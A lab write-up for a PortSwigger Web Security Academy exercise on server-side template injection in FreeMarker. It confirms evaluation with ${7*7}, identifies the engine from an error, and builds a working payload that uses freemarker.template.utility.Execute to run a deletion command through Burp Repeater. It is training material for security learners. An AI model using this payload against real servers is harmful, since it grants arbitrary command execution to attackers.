# Server-Side Template Injection Using Documentation



> **PortSwigger Web Security Academy — Practitioner Lab**

> **Vulnerability:** Server-Side Template Injection (SSTI)

> **Template Engine:** FreeMarker


> **Status:** Solved ✅



## Lab Objective




The application is vulnerable to **Server-Side Template Injection (SSTI)**.



The goal is to:



1. Identify the template engine.

2. Use its documentation to find a path to arbitrary code execution.

3. Execute a system command.

4. Delete:



```text

/home/carlos/morale.txt

```


### Credentials



```text

Username: content-manager

Password: C0nt3ntM4n4g3r

```



---



## 1. Identify the Injection Point



After logging in, use the content manager functionality to edit a product description template.



The relevant request is:



```http

POST /product/template?productId=1

```



The important parameter is:



```text

template=

```



For example:



```text

csrf=...&template=TEST&template-action=save


```



This means that we can control the contents of the server-side template.



---



## 2. Test for SSTI



FreeMarker uses the following syntax to evaluate expressions:



```text

${expression}

```



Test with:



```text

${7*7}

```



Save the template and view the product page.



The result is:



```text

49

```



Because:



```text

7 * 7 = 49

```



### Conclusion



The server is evaluating our input as template syntax.



Therefore, an **SSTI vulnerability** exists.



---



## 3. Identify the Template Engine



To identify the template engine, use an invalid expression:



```text

${foobar}

```



Save the template and view the product page.



The resulting error message reveals that the application is using:



```text

FreeMarker

```



### Why this matters



Different template engines have different syntax and exploitation techniques.



Therefore, identifying the engine is an important step in SSTI exploitation.



---


## 4. Understand FreeMarker


**FreeMarker** is a Java-based template engine.



It combines:



```text

Template + Data

        ↓

FreeMarker

        ↓

Generated Output

```


For example:




```text

Hello ${name}

```



If:



```text

name = Aisha

```



the rendered result becomes:



```text

Hello Aisha

```



The important syntax in this lab is:



```text

${...}

```



which evaluates an expression.



Therefore:



```text

${7*7}

```



is evaluated by FreeMarker as:



```text

49

```



---



## 5. Research the FreeMarker Documentation



Instead of guessing an exploit, investigate the FreeMarker documentation.



The documentation contains security information about allowing users to upload or control templates.



A key feature is the:



```text

new()

```



built-in.



The documentation explains that `new()` can be dangerous when processing untrusted templates because it can be used 

to instantiate certain Java objects.


[Apache FreeMarker Documentation](https://freemarker.apache.org/docs/?utm_source=chatgpt.com)


---


## 6. Follow `new()` to `TemplateModel`



The `new()` documentation explains that it can instantiate classes that implement:



```text

TemplateModel

```



Therefore, investigate the JavaDoc for:



```text

TemplateModel

```


Look at:



```text

All Known Implementing Classes

```



Among the implementing classes is:



```text

Execute

```



The relevant class is:




```text

freemarker.template.utility.Execute

```



This class can be used to execute shell commands.




---



## 7. Build the Exploit



The final payload is:



```text

<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }

```



Let's break it down.



### Part 1 — Create the `Execute` object



```text

<#assign ex="freemarker.template.utility.Execute"?new()>

```



This uses:




```text

new()

```



to create an instance of:



```text

freemarker.template.utility.Execute

```



The object is stored in the variable:



```text

ex

```



---



### Part 2 — Execute the command



```text

${ ex("rm /home/carlos/morale.txt") }

```



This calls the `Execute` object with the command:



```bash

rm /home/carlos/morale.txt

```



The command deletes Carlos's file.



---


## 8. Send the Payload



In Burp Repeater, go back to:



```http

POST /product/template?productId=1

```



Replace the value of:



```text

template=

```



with:



```text

<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }

```



Keep:



```text

template-action=save

```


Then send the request.


After saving the template, visit the product page so that the template is rendered.


The command is executed during rendering:



```bash
rm /home/carlos/morale.txt

```



The lab is then solved.


---



# Exploitation Flow




```text

User-controlled template

        ↓

${7*7}

        ↓


49

        ↓


SSTI confirmed

        ↓

${foobar}

        ↓

Template error

        ↓

Identify FreeMarker

        ↓

Read FreeMarker documentation

        ↓
new()

        ↓
TemplateModel

        ↓

Execute

        ↓

freemarker.template.utility.Execute

        ↓

Command execution

        ↓

rm /home/carlos/morale.txt

        ↓

Lab Solved

```


---



# Key Payloads



### SSTI Test




```text

${7*7}

```



### Template Engine Identification



```text

${foobar}

```




### Final Payload




```text


<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }

```


---


# Key Takeaways



The most important lesson from this lab is **not to memorize the final payload**.



Instead, remember the methodology:



```text

1. Find user-controlled template input

2. Test whether expressions are evaluated

3. Identify the template engine

4. Read the engine's documentation

5. Find dangerous functionality

6. Trace the relevant classes/objects


7. Build the exploit

8. Execute the required lab action

```


For this lab:



```text


${7*7}

      ↓

FreeMarker

      ↓

new()

      ↓

TemplateModel

      ↓

Execute

      ↓

Command Execution

```



---



## References


* [PortSwigger — Server-side template injection](https://portswigger.net/web-security/server-side-template-injection?)

* [PortSwigger Research — Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection?)

* [Apache FreeMarker Documentation](https://freemarker.apache.org/docs)
